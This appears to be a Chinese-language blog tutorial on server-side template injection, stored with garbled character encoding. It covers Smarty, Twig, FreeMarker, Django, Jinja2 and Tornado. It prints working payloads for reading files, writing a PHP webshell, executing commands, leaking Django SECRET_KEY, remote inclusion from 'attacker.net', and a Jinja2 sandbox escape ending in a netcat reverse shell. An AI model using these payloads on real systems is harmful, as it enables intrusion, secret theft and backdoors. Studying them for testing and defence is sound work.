Smartyç®—æ˜¯ä¸€ç§å¾ˆè€çš„PHPæ¨¡æ¿å¼•æ“äº†ï¼Œéå¸¸çš„ç»å…¸ï¼Œä½¿ç”¨çš„æ¯”è¾ƒå¹¿æ³› Twig Twigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚ Blade Blade æ˜¯ Laravel æä¾›çš„ä¸€ä¸ªæ—¢ç®€å•åˆå¼ºå¤§çš„æ¨¡æ¿å¼•æ“ã€‚ å’Œå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ä¸ä¸€æ ·ï¼ŒBlade å¹¶ä¸é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿ PHP ä»£ç ã€‚æ‰€æœ‰ Blade è§†å›¾æ–‡ä»¶éƒ½å°†è¢«ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ï¼Œé™¤éå®ƒè¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç¼–è¯‘ï¼Œè¿™å°±æ„å‘³ç€ Blade åŸºæœ¬ä¸Šä¸ä¼šç»™ä½ çš„åº”ç”¨å¢åŠ ä»»ä½•é¢å¤–è´Ÿæ‹…ã€‚ 2.Java å¸¸ç”¨çš„JSP è¿™ä¸ªå¼•æ“æˆ‘æƒ³åº”è¯¥æ²¡äººä¸çŸ¥é“å§ï¼Œè¿™ä¸ªåº”è¯¥ä¹Ÿæ˜¯æˆ‘æœ€åˆå­¦ä¹ çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œéå¸¸çš„ç»å…¸ FreeMarker FreeMarkeræ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼š å³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬ï¼ˆHTMLç½‘é¡µã€ç”µå­é‚®ä»¶ã€é…ç½®æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰çš„é€šç”¨å·¥å…·ã€‚ å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚ Velocity Velocityä½œä¸ºå†å²æ‚ ä¹…çš„æ¨¡æ¿å¼•æ“ä¸å•å•å¯ä»¥æ›¿ä»£JSPä½œä¸ºJava Webçš„æœåŠ¡ç«¯ç½‘é¡µæ¨¡æ¿å¼•æ“ï¼Œè€Œä¸”å¯ä»¥ä½œä¸ºæ™®é€šæ–‡æœ¬çš„æ¨¡æ¿å¼•æ“æ¥å¢å¼ºæœåŠ¡ç«¯ç¨‹åºæ–‡æœ¬å¤„ç†èƒ½åŠ›ã€‚ 3.Python å¸¸ç”¨çš„Jinja2 flask jinja2 ä¸€ç›´æ˜¯ä¸€èµ·è¯´çš„ï¼Œä½¿ç”¨éå¸¸çš„å¹¿æ³›ï¼Œæ˜¯æˆ‘å­¦ä¹ çš„ç¬¬ä¸€ä¸ªæ¨¡æ¿å¼•æ“ django django åº”è¯¥ä½¿ç”¨çš„æ˜¯ä¸“å±äºè‡ªå·±çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œæˆ‘è¿™é‡Œå§‘ä¸”å°±å«ä»– djangoï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ django ä»¥å¿«é€Ÿå¼€å‘è‘—ç§°ï¼Œæœ‰è‡ªå·±å¥½ç”¨çš„ORMï¼Œä»–çš„å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯è€¦åˆæ€§éå¸¸é«˜çš„ï¼Œä½ ä½¿ç”¨åˆ«çš„å°±ä¸èƒ½å‘æŒ¥å‡º django çš„ç‰¹æ€§äº† tornado tornado ä¹Ÿæœ‰å±äºè‡ªå·±çš„ä¸€å¥—æ¨¡æ¿å¼•æ“ï¼Œtornado å¼ºè°ƒçš„æ˜¯å¼‚æ­¥éé˜»å¡é«˜å¹¶å‘ 4.æ³¨æ„ï¼šåŒä¸€ç§è¯­è¨€ä¸åŒçš„æ¨¡æ¿å¼•æ“æ”¯æŒçš„è¯­æ³•è™½ç„¶å¾ˆåƒï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç•¥å¾®çš„å·®å¼‚çš„ï¼Œæ¯”å¦‚ tornado render() ä¸­æ”¯æŒä¼ å…¥è‡ªå®šä¹‰å‡½æ•°ï¼Œä»¥åŠå‡½æ•°çš„å‚æ•°ï¼Œç„¶ååœ¨ä¸¤ä¸ªå¤§æ‹¬å· 1{{}} ä¸­æ‰§è¡Œ,ä½†æ˜¯ django çš„æ¨¡æ¿å¼•æ“ç›¸å¯¹äºtornado æ¥è¯´å°±ç›¸å¯¹éš¾ç”¨ä¸€äº› phpå®ä¾‹:1234567&lt;?phprequire_once dirname(__FILE__).â€˜/../lib/Twig/Autoloader.phpâ€˜;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[â€˜nameâ€˜]}&quot;); // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†echo $output; pythonå®ä¾‹1234567891011@app.errorhandler(404)def page_not_found(e): template = '''{%% extends &quot;layout.html&quot; %%}{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt;{%% endblock %%}''' % (request.url) return render_template_string(template), 404 javaå®ä¾‹12&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } æ£€æµ‹æ–¹æ³•è¿™é‡Œæä¾›ä¸€ä¸ªå¤§ç‰›å†™çš„ SSTI çš„æ£€æµ‹å·¥å…· https://github.com/epinna/tplmapæˆ–è€…64éªŒè¯æ˜¯å¦ä¼šè¢«è¿ç®—è¾“å‡º æ”»å‡»æ–¹å‘0X06 æ”»å‡»æ€è·¯1.æ”»å‡»æ–¹å‘ï¼šæ‰¾åˆ°æ¨¡æ¿æ³¨å…¥ä¸»è¦ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ”»å‡» (1)æ¨¡æ¿æœ¬èº«(2)æ¡†æ¶æœ¬èº«(3)è¯­è¨€æœ¬èº«(4)åº”ç”¨æœ¬èº« 2.æ”»å‡»æ–¹æ³•ï¼šæˆ‘ä»¬çŸ¥é“ SSTI èƒ½å¤Ÿé€ æˆå¾ˆå¤šç§å±å®³ï¼ŒåŒ…æ‹¬ æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€RCEã€GetShell ç­‰ï¼Œå…³é”®å°±åœ¨äºå¦‚ä½•æ‰èƒ½åˆ©ç”¨è¿™ä¸ªæ³¨å…¥ç‚¹æ‰§è¡Œæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯»æ‰¾åˆ©ç”¨ç‚¹çš„èŒƒå›´å®é™…ä¸Šå°±æ˜¯åœ¨æˆ‘ä»¬ä¸Šé¢çš„å››ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯æ¨¡æ¿æœ¬èº«æ”¯æŒçš„è¯­æ³•ã€å†…ç½®å˜é‡ã€å±æ€§ã€å‡½æ•°ï¼Œè¿˜æœ‰å°±æ˜¯çº¯ç²¹æ¡†æ¶çš„å…¨å±€å˜é‡ã€å±æ€§ã€å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬è€ƒè™‘è¯­è¨€æœ¬èº«çš„ç‰¹æ€§ï¼Œæ¯”å¦‚ é¢å‘å¯¹è±¡çš„å†…çœæœºåˆ¶ï¼Œæœ€æœ€æœ€åæˆ‘ä»¬æ— èƒ½ä¸ºåŠ›çš„æ—¶å€™æ‰è€ƒè™‘æ€ä¹ˆå¯»æ‰¾åº”ç”¨å®šä¹‰çš„ä¸€äº›ä¸œè¥¿ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯å‡ ä¹æ²¡æœ‰æ–‡æ¡£çš„ï¼Œæ˜¯å¼€å‘è€…çš„è‡ªè¡Œè®¾è®¡ï¼Œä¸€èˆ¬éœ€è¦æ‹¿åˆ°åº”ç”¨çš„æºç æ‰èƒ½è€ƒè™‘ï¼Œäºæ˜¯æˆ‘å°†å…¶æ”¾åœ¨æœ€åä¸€ä¸ª æ³¨æ„ï¼š åœ¨è¿™ç§é¢å‘å¯¹è±¡çš„è¯­è¨€ä¸­ï¼Œè·å–çˆ¶ç±»è¿™ç§æ€æƒ³è¦è´¯ç©¿å§‹ç»ˆï¼Œç†è®ºåŸºç¡€å°±æ˜¯ Python çš„é­”æ³•æ–¹æ³• PHP çš„è‡ªçœ JAVA çš„åå°„ æœºåˆ¶ 1.åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»1.SmartySmartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function) ä½†æ˜¯ï¼Œå®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½ Smarty å¾ˆç…§é¡¾æˆ‘ä»¬ï¼Œåœ¨é˜…è¯»æ¨¡æ¿çš„æ–‡æ¡£ä»¥åæˆ‘ä»¬å‘ç°ï¼š$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„å¥½ç”¨çš„æ–¹æ³• æ¯”å¦‚ï¼šgetStreamVariable() github ä¸­æ˜ç¡®æŒ‡å‡ºï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµï¼ˆè¯´äººè¯å°±æ˜¯è¯»æ–‡ä»¶ï¼‰ payload: 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} å†æ¯”å¦‚ï¼šclass Smarty_Internal_Write_File æœ‰äº†ä¸Šé¢çš„è¯»æ–‡ä»¶å½“ç„¶è¦æ‰¾ä¸€ä¸ªå†™æ–‡ä»¶çš„äº†ï¼Œè¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªwriteFileæ–¹æ³• å‡½æ•°åŸå‹ï¼š 1public function writeFile($_filepath, $_contents, Smarty $smarty) ä½†æ˜¯è¿™ä¸ªç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª Smarty ç±»å‹ï¼Œåæ¥æ‰¾åˆ°äº† self::clearConfig() å‡½æ•°åŸå‹ï¼š 1234public function clearConfig($varname = null){ return Smarty_Internal_Extension_Config::clearConfig($this, $varname);} èƒ½å†™æ–‡ä»¶å¯¹æ”»å‡»è€…çœŸçš„æ˜¯å¤ªæœ‰åˆ©äº†ï¼Œä¸€èˆ¬ä¸å‡ºæ„å¤–èƒ½ç›´æ¥ getshell payloadï¼š 1{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET['cmd']); ?&gt;&quot;,self::clearConfig())} 2.Twigç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ self:: è°ƒç”¨é™æ€å˜é‡äº†ï¼Œä½†æ˜¯ é€šè¿‡å®˜æ–¹æ–‡æ¡£çš„æŸ¥è¯¢ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° Twig ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ª _self, è™½ç„¶ _self æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ª env å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° envæ˜¯æŒ‡å±æ€§Twig_Environmentå¯¹è±¡ï¼ŒTwig_Environmentå¯¹è±¡æœ‰ä¸€ä¸ª setCacheæ–¹æ³•å¯ç”¨äºæ›´æ”¹Twigå°è¯•åŠ è½½å’Œæ‰§è¡Œç¼–è¯‘æ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä½ç½®(ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®˜æ–¹æ–‡æ¡£æ²¡æœ‰çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œåæ¥æˆ‘æ‰¾åˆ°äº†Twig çš„æºç ä¸­çš„ environment.php å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° å› æ­¤ï¼Œæ˜æ˜¾çš„æ”»å‡»æ˜¯é€šè¿‡å°†ç¼“å­˜ä½ç½®è®¾ç½®ä¸ºè¿œç¨‹æœåŠ¡å™¨æ¥å¼•å…¥è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š payload: 12{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}} ä½†æ˜¯æ–°çš„é—®é¢˜å‡ºç°äº†ï¼Œallow_url_include ä¸€èˆ¬æ˜¯ä¸æ‰“å¼€çš„ï¼Œæ²¡æ³•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ²¡å…³ç³»è¿˜æœ‰ä¸ªè°ƒç”¨è¿‡æ»¤å™¨çš„å‡½æ•° getFilter() è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†ä¸€ä¸ª call_user_function æ–¹æ³• 123456789101112131415public function getFilter($name){ [snip] foreach ($this-&gt;filterCallbacks as $callback) { if (false !== $filter = call_user_func($callback, $name)) {//æ³¨æ„è¿™è¡Œ return $filter; } } return false;}public function registerUndefinedFilterCallback($callable){ $this-&gt;filterCallbacks[] = $callable;} æˆ‘ä»¬åªè¦æŠŠexec() ä½œä¸ºå›è°ƒå‡½æ•°ä¼ è¿›å»å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œäº† payload: 123{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} 3.freeMarkerè¿™ä¸ªæ¨¡æ¿ä¸»è¦ç”¨äº java ï¼Œåœ¨ä¸Šé¢æˆ‘ä¸¾ä¾‹ java çš„ SSTI çš„æ—¶å€™æˆ‘å·²ç»ç®€ç­”çš„åˆ†æè¿‡è¿™ä¸ªçš„ä¸€ä¸ª payloadï¼Œæˆ‘å¸Œæœ›è¯»è€…ä¹Ÿèƒ½æŒ‰ç…§ æŸ¥æ‰¾æ–‡æ¡£ï¼ŒæŸ¥çœ‹æ¡†æ¶æºç ï¼Œç­‰æ–¹å¼å¯»æ‰¾è¿™ä¸ª payload çš„æ€è·¯æ¥æº payload: 1&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } 2.åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»å› ä¸ºè¿™é‡Œé¢çš„æ‘¸å§æ¨¡æ¿ä¼¼ä¹éƒ½æ˜¯å†…ç½®äºæ¡†æ¶å†…çš„ï¼Œäºæ˜¯æˆ‘å°±å°†å…¶æ”¾åœ¨åˆ©ç”¨æ¡†æ¶è¿™ä¸€èŠ‚ 1.Django123def view(request, *args, **kwargs): template = 'Hello {user}, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) æ³¨å…¥ç‚¹å¾ˆæ˜æ˜¾å°±æ˜¯ emailï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„èƒ½åŠ›å·²ç»è¢«é™åˆ¶çš„å¾ˆæ­»ï¼Œå¾ˆéš¾æ‰§è¡Œå‘½ä»¤ï¼Œä½†åˆæƒ³è·å–å’Œ User æœ‰å…³çš„é…ç½®ä¿¡æ¯çš„è¯ï¼Œæˆ‘ä¹ˆæ€ä¹ˆåŠï¼Ÿ å¯ä»¥å‘ç°æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°çš„åªæœ‰æœ‰ä¸€ä¸ª å’Œuser æœ‰å…³çš„å˜é‡ï¼Œé‚£å°±æ˜¯ request user ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿ pç‰›åœ¨è‡ªå·±çš„åšå®¢ä¸­åˆ†äº«äº†è¿™ä¸ªæ€è·¯ï¼Œæˆ‘æŠŠå®ƒå¼•ç”¨è¿‡æ¥ï¼š Djangoæ˜¯ä¸€ä¸ªåºå¤§çš„æ¡†æ¶ï¼Œå…¶æ•°æ®åº“å…³ç³»é”™ç»¼å¤æ‚ï¼Œæˆ‘ä»¬å…¶å®æ˜¯å¯ä»¥é€šè¿‡å±æ€§ä¹‹é—´çš„å…³ç³»å»ä¸€ç‚¹ç‚¹æŒ–æ˜æ•æ„Ÿä¿¡æ¯ã€‚ä½†Djangoä»…ä»…æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œåœ¨æ²¡æœ‰ç›®æ ‡æºç çš„æƒ…å†µä¸‹å¾ˆéš¾å»æŒ–æ˜ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯å°±æ˜¯ï¼šå»æŒ–æ˜Djangoè‡ªå¸¦çš„åº”ç”¨ä¸­çš„ä¸€äº›è·¯å¾„ï¼Œæœ€ç»ˆè¯»å–åˆ°Djangoçš„é…ç½®é¡¹ ä»€ä¹ˆæ„æ€ï¼Œç®€å•åœ°è¯´å°±æ˜¯æˆ‘ä»¬åœ¨æ²¡æœ‰åº”ç”¨æºç çš„æƒ…å†µä¸‹è¦å­¦ä¼šå»å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å±æ€§ï¼Œçœ‹è¿™ä¸ªç©ºæ¡†æ¶æœ‰ä»€ä¹ˆå±æ€§å’Œç±»ä¹‹é—´çš„å¼•ç”¨ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥çš„é è¿‘æˆ‘ä»¬çš„ç›®æ ‡ åæ¥æˆ‘ä»¬å‘ç°ï¼Œç»è¿‡ç¿»æ‰¾ï¼Œæˆ‘å‘ç°Djangoè‡ªå¸¦çš„åº”ç”¨â€œadminâ€ï¼ˆä¹Ÿå°±æ˜¯Djangoè‡ªå¸¦çš„åå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š å¦‚ä¸‹å›¾ï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° æ‰€ä»¥ï¼Œæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šæˆ‘ä»¬åªéœ€è¦é€šè¿‡æŸç§æ–¹å¼ï¼Œæ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚ payload: 123http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} 2.Flask/Jinja2config æ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€œå½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼ŒSECRET_KEYç­‰æ•æ„Ÿå€¼ã€‚è™½ç„¶configæ˜¯ä¸€ä¸ªç±»å­—å…¸å¯¹è±¡ï¼Œä½†æ˜¯é€šè¿‡æŸ¥é˜…æ–‡æ¡£å¯ä»¥å‘ç° config æœ‰å¾ˆå¤šç¥å¥‡çš„æ–¹æ³•ï¼šfrom_envvar, from_object, from_pyfile, ä»¥åŠroot_pathã€‚ å¦‚å›¾æ‰€ç¤ºï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ from_pyfile å’Œ from_object æ¥å‘½ä»¤æ‰§è¡Œï¼Œä¸‹é¢æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°çš„æºä»£ç ï¼ˆä¸ºäº†é˜…è¯»æ¸…æ™°ï¼Œæ³¨é‡Šæˆ‘åˆ é™¤äº†ï¼‰ æºç ï¼š 123456789101112131415161718192021222324def from_pyfile(self, filename, silent=False): filename = os.path.join(self.root_path, filename) d = types.ModuleType('config') d.__file__ = filename try: with open(filename) as config_file: exec(compile(config_file.read(), filename, 'exec'), d.__dict__) except IOError as e: if silent and e.errno in (errno.ENOENT, errno.EISDIR): return False e.strerror = 'Unable to load configuration file (%s)' % e.strerror raise self.from_object(d) return Truedef from_object(self, obj): if isinstance(obj, string_types): obj = import_string(obj) for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) ç®€å•çš„è§£é‡Šä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•å°†ä¼ å…¥çš„æ–‡ä»¶ä½¿ç”¨ compile() è¿™ä¸ªpython çš„å†…ç½®æ–¹æ³•å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç (.pyc),å¹¶æ”¾åˆ° exec() é‡Œé¢å»æ‰§è¡Œï¼Œæ³¨æ„æœ€åä¸€ä¸ªå‚æ•° d.__dict__ç¿»é˜…æ–‡æ¡£å‘ç°ï¼Œè¿™ä¸ªå‚æ•°çš„å«ä¹‰æ˜¯æŒ‡å®š exec æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ï¼Œ å¦‚å›¾æ‰€ç¤ºï¼š [![æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python exec.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python exec.png)æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° æˆ‘ä»¬ç®€å•çš„æ¨¡æ‹Ÿä¸€ä¸‹çœ‹ä¸€ä¸‹æ•ˆæœ å¦‚å›¾æ‰€ç¤º: æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿°æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° æ‰§è¡Œçš„ä»£ç ç‰‡æ®µè¢«æ”¾å…¥äº† d.__dict__ ä¸­,è¿™çœ‹ä¼¼æ²¡è®¾ä¹ˆç”¨ï¼Œä½†æ˜¯ç¥å¥‡çš„æ˜¯åé¢ä»–è°ƒç”¨äº† from_object() æ–¹æ³•ï¼Œæ ¹æ®æºç  123for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) è¿™ä¸ªæ–¹æ³•ä¼šéå† Obj çš„ dict å¹¶ä¸”æ‰¾åˆ°å¤§å†™å­—æ¯çš„å±æ€§ï¼Œå°†å±æ€§çš„å€¼ç»™ self[â€˜å±æ€§åâ€™]ï¼Œæ‰€ä»¥è¯´å¦‚æœæˆ‘ä»¬èƒ½è®© from_pyfile å»è¯»è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ 12from os import systemSHELL = system åˆ°æ—¶å€™æˆ‘ä»¬å°±èƒ½é€šè¿‡ config[â€˜SHELLâ€™] è°ƒç”¨ system æ–¹æ³•äº† é‚£ä¹ˆæ–‡ä»¶æ€ä¹ˆå†™å…¥å‘¢ï¼ŸJinja2 æœ‰æ²™ç›’æœºåˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ç»•è¿‡æ²™ç›’çš„æ–¹å¼å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ï¼Œå…·ä½“çš„æ²™ç›’ç»•è¿‡å¯ä»¥å‚è€ƒæˆ‘çš„ä¸€ç¯‡åšæ–‡[python æ²™ç›’é€ƒé€¸å¤‡å¿˜](http://www.k0rz3n.com/2018/05/04/Python æ²™ç›’é€ƒé€¸å¤‡å¿˜/) æœ€ç»ˆçš„ payload: 123456{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}//å†™æ–‡ä»¶{{ config.from_pyfile('/tmp/evil') }}//åŠ è½½system{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}//æ‰§è¡Œå‘½ä»¤åå¼¹SHELL 3.Tornadoå†™æ–‡ç« çš„æ—¶å€™æ­£å·§èµ¶ä¸ŠæŠ¤ç½‘æ¯å‡ºäº†ä¸€é“ tornado çš„ SSTI äºæ˜¯è¿™é‡Œä¹Ÿä½œä¸ºä¸€ä¸ªæ¯”è¾ƒå¥½çš„ä¾‹å­ç»™å¤§å®¶è¯´æ˜ æ ¹æ®æç¤ºè¿™é“é¢˜çš„æ„æ€å°±æ˜¯é€šè¿‡SSTI è·å– cookie_secretï¼Œä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ 1&quot;%'()*-/=[\\]_| ç”šè‡³æŠŠ_(ä¸‹åˆ’çº¿)éƒ½è¿‡æ»¤äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ²¡æ³•é€šè¿‡Python çš„é­”æ³•æ–¹æ³•è¿›è¡Œæ²™ç›’é€ƒé€¸æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å®é™…ä¸Šå¯¹æˆ‘ä»¬çš„å¯»æ‰¾åˆé€‚çš„ tornado çš„å†…ç½®çš„æ–¹æ³•ä¹Ÿæœ‰å¾ˆå¤šçš„é™åˆ¶ã€‚ æˆ‘è§‰å¾—é™¤äº†ç›´æ¥é˜…è¯»å®˜æ–¹çš„æ–‡æ¡£ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ä¸‹è½½ tornado çš„æ¡†æ¶æºç ï¼Œå…¨å±€æœç´¢ cookie_secret å¦‚ä¸‹å›¾ï¼š æ­¤å¤„è¾“å…¥å›¾ç‰‡çš„æè¿° ä½ ä¼šå‘ç° cookie_secret æ˜¯handler.application.settings çš„é”®å€¼ï¼Œé‚£æˆ‘ä»¬åªè¦è·å–åˆ°è¿™ä¸ªå¯¹è±¡æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼Œæ²¡é”™ï¼Œé‚£ä¹ˆ handler æ˜¯ä»€ä¹ˆï¼Œçœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘ç‰¹åœ°çœ‹ä¸€ä¸‹æ¨¡æ¿çš„å¯¹æ¡†æ¶çš„è¯­æ³•æ”¯æŒ(å› ä¸ºï¼Œæ¨¡æ¿ä¸­æœ‰ä¸€äº›å†…ç½®çš„å¯¹è±¡ç­‰åŒäºæ¡†æ¶ä¸­çš„å¯¹è±¡ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸ºäº†æ–¹ä¾¿ä¹¦å†™å‰æ®µå°±ä¼šç»™ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„åå­—ï¼Œå°±æ¯”å¦‚ JSP çš„ request å†…ç½®å¯¹è±¡å®é™…ä¸Šå¯¹åº”ç€ servlet ä¸­çš„ HttpServletRequest ) 